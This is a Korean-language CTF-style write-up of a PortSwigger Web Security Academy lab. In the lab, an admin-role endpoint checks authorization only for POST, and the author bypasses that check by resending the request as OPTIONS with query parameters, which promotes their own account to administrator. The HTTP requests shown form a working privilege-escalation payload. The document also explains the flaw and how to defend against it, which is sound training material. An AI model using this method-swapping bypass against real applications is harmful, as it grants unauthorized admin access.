+++
date = '2026-07-04T15:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Method-based access control can be circumvented'
summary = "POST에만 걸린 권한 검사를 OPTIONS 메서드로 우회해 자신의 계정을 관리자로 승격시키는 풀이"
toc = true
tags = ["Access Control", "Authorization", "HTTP Method", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)

> ![image.png](/writeup/portswigger/access-control/11/1.png)

애플리케이션이 부분적으로 HTTP 메서드를 기반으로 접근 제어를 한다. 관리자 패널은 `administrator:admin` 계정으로 미리 둘러볼 수 있으며, `wiener:peter` 계정으로 로그인해 접근 제어 결함을 이용해 스스로 관리자가 되면 문제가 해결된다.

### Access Control 진단

먼저 관리자 계정으로 접속해 패널 기능을 확인한다.

![image.png](/writeup/portswigger/access-control/11/2.png)

사용자를 선택해 업그레이드·다운그레이드하는 형태이며, 실제 요청은 다음과 같다.

```http
POST /admin-roles HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<admin-session>
Content-Type: application/x-www-form-urlencoded

username=carlos&action=upgrade
```

이 요청을 세션 없이, 또는 `wiener` 세션으로 보내면 차단된다.

```http
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
Set-Cookie: session=ThoCKsUz6WJ7jC06sdidBHABdP2BCar8; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

문제에서 "부분적으로" 메서드 기반 검증을 한다고 했으므로, 권한 검사가 특정 메서드에만 걸려 있을 가능성을 의심한다. 관리자 세션이 아닌 상태에서 메서드를 `OPTIONS`로 바꿔 보낸다.

```http
OPTIONS /admin-roles?username=carlos&action=upgrade HTTP/2
Host: <lab-id>.web-security-academy.net
```

`POST`일 때의 `401`과 달리 차단되지 않고 정상 처리 응답이 돌아온다. 권한 검사가 `POST`에만 걸려 있고 다른 메서드는 검사 없이 같은 처리를 수행한다는 뜻이다.

---

## 익스플로잇

`wiener` 계정을 승격시키는 요청을 `OPTIONS` 메서드로 구성해 파라미터를 쿼리에 담아 보낸다.

```http
OPTIONS /admin-roles?username=wiener&action=upgrade HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<wiener-session>
```

요청이 정상 처리되어 `wiener`가 관리자로 승격되며, 문제가 해결된다.

![image.png](/writeup/portswigger/access-control/11/3.png)

---

## 정리

이 랩은 권한 검사를 **행위가 아니라 메서드에** 건 결함이다. `/admin-roles`가 수행하는 행위는 "역할 변경"이고 그것이 관리자 전용이어야 한다. 그런데 애플리케이션은 그 행위 자체가 아니라 `POST` 요청에만 검사를 걸어 두었다. 같은 엔드포인트가 다른 메서드로도 처리되면서, 검사 밖의 통로가 그대로 열려 있었다.

이는 CSRF의 [메서드 의존 검증](/write-up/portswigger/csrf/write-up-portswigger---csrf-where-token-validation-depends-on-request-method/) 랩과 정확히 같은 사고방식의 결함이다. 그쪽은 CSRF 토큰 검증이 `POST`에만 걸려 `GET`으로 우회됐고, 이쪽은 권한 검증이 `POST`에만 걸려 `OPTIONS`로 우회된다. 검증을 조건(메서드)에 걸면 공격자는 값을 맞출 필요 없이 **검증 대상에서 벗어나기만** 하면 된다.

`OPTIONS`가 통한 이유는 프레임워크가 정의되지 않은 메서드도 핸들러로 라우팅하면서 인증 필터는 특정 메서드에만 적용했기 때문이다. 진단에서는 관리자 기능이 `401`/`403`으로 막히면 `GET`·`POST`·`OPTIONS`·`HEAD` 등으로 메서드를 바꿔 같은 행위가 검사 없이 처리되는지 확인한다. 파라미터를 본문에서 쿼리로 옮겨야 할 수도 있다.

방어는 접근 제어를 **메서드와 무관하게 행위 실행 직전에** 일괄 적용하는 것이다. 하나의 기능이 여러 메서드로 열려 있다면 모든 경로가 같은 권한 검사를 통과하도록 해야 하고, 지원하지 않는 메서드는 명시적으로 거부해야 한다. 진단 흐름은 [Access Control Playbook](/playbook/playbook-access-control-%EC%A7%84%EB%8B%A8-cheat-sheet/)에 정리했다.
